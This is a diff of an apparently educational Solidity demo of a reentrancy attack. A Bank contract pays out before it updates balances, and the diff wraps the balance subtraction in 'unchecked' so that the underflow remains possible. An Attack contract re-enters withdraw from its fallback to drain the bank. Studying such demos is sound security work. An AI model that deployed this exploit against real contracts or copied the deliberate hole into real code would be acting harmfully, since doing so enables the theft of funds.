@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: GPL-3.0
 
-//pragma solidity >=0.7.0 <0.9.0;
-pragma solidity 0.6.10;
+pragma solidity >=0.7.0 <0.9.0;
+//pragma solidity 0.6.10;
 
 import "hardhat/console.sol";
 
@@ -20,8 +20,12 @@ contract Bank {
         (bool result, bytes memory data) = msg.sender.call{value:_val}("");
         require(result, string(data));
         //Does not happen if latest solidity compiler is used 0.8
-        //Since arithmetic underflow is caught
-        balances[msg.sender] -= _val;
+        //since arithmetic underflow is caught
+		//Or 
+		//use unchecked 
+		unchecked {
+        	balances[msg.sender] -= _val;
+		}
         console.log("bank : ", balances[msg.sender] );
     }
 
@@ -37,13 +41,13 @@ contract Attack {
         bank = Bank(_bank);
     }
 
-    function attack() external{
+    function attack() external payable{
         bank.deposit{value: 1 ether}();
         bank.withdraw(1 ether);
     }
 
     fallback() external payable {
-        uint256 balance = address(bank).balance / 10**18;
+        uint256 balance = address(bank).balance;
         console.log("Fallback start", balance);
         if(address(bank).balance >= 8 ether) {
             console.log("Fallback if ");
@@ -54,7 +58,7 @@ contract Attack {
     
     function balance() external view returns(uint256) {
         console.log("Attack Balance is ", address(this).balance);
-        return address(this).balance / 10**18;
+        return address(this).balance;
     }
 }
 
@@ -64,7 +68,7 @@ contract user {
         bank = Bank(_bank);
     }
 
-    function deposit() external {
+    function deposit() external payable {
         bank.deposit{value: 10 ether}();
     }
 }
